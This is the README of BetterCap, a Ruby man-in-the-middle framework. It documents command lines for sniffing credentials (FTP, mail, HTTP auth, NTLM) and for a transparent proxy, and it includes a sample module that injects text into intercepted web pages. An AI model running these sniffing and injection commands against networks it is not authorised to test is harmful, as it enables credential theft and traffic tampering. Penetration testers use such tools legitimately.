BETTERCAP
==

Copyleft of **Simone 'evilsocket' Margaritelli**.  
http://www.evilsocket.net/

---

BetterCap is an attempt to create a complete, modular, portable and easily extensible **MITM** framework with every kind of features could be needed while performing a man in the middle attack.  

CREDENTIALS SNIFFER
===

The built in sniffer is currently able to dissect and print from the network the following informations:

- URLs being visited.
- HTTPS host being visited.
- HTTP POSTed data.
- HTTP Basic and Digest authentications.
- FTP credentials.
- IRC credentials.
- POP, IMAP and SMTP credentials.
- NTLMv1/v2 ( HTTP, SMB, LDAP, etc ) credentials.

**Examples**

Default sniffer mode, all parsers enabled:
    
    sudo ruby bettercap.rb -X
    
Enable sniffer and load only specified parsers:
    
    sudo ruby bettercap.rb -X -P "FTP,HTTPAUTH,MAIL,NTLMSS"

Enable sniffer + all parsers and parse local traffic as well:
    
    sudo ruby bettercap.rb -X -L
    
TRANSPARENT PROXY
===

A modular transparent proxy can be started with the --proxy argument, by default it won't do anything 
but logging HTTP requests, but if you specify a **--proxy-module** argument you will be able to load
your own modules and manipulate HTTP traffic as you like.  

**Examples**

Enable proxy on default ( 8080 ) port with no modules ( quite useless ): 
    
    sudo ruby bettercap.rb --proxy

Enable proxy and use a custom port:
    
    sudo ruby bettercap.rb --proxy --proxy-port=8081
    
Enable proxy and load the module **example_proxy_module.rb**:
    
    sudo ruby bettercap.rb --proxy --proxy-module=example_proxy_module.rb

Disable spoofer and enable proxy ( stand alone proxy mode ):

    sudo ruby bettercap.rb -S NONE --proxy

**Modules**

You can easily implement a module to inject data into pages or just inspect the
requests/responses creating a ruby file and passing it to bettercap with the --proxy-module argument, 
the following is a sample module that injects some contents into the title tag of each html page.

```ruby
class HackTitle < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type == 'text/html'
      Logger.info "Hacking http://#{request.host}#{request.url} title tag"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '<title>', '<title> !!! HACKED !!! ' )
    end
  end
end
```

DEPENDS
===
- colorize (**gem install colorize**)
- packetfu (**gem install packetfu**)
- pcaprub  (**gem install pcaprub**) [sudo apt-get install ruby-dev libpcap-dev]

